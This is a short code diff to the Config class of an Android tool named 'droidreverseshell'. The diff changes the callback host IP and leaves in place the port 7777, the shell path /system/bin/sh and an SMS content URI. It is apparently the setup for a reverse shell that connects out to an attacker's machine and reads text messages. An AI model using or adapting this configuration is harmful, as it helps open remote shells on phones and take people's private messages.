@@ -5,7 +5,7 @@ package solidus.android.droidreverseshell;
  */
 public class Config {
     // Reverse Shell stuff
-    public static final String HOST = "192.168.2.4";
+    public static final String HOST = "192.168.1.40";
     public static final String PORT = "7777";
     public static final String SHELL_PATH = "/system/bin/sh";
     public static final String SMS_URL = "content://sms/";
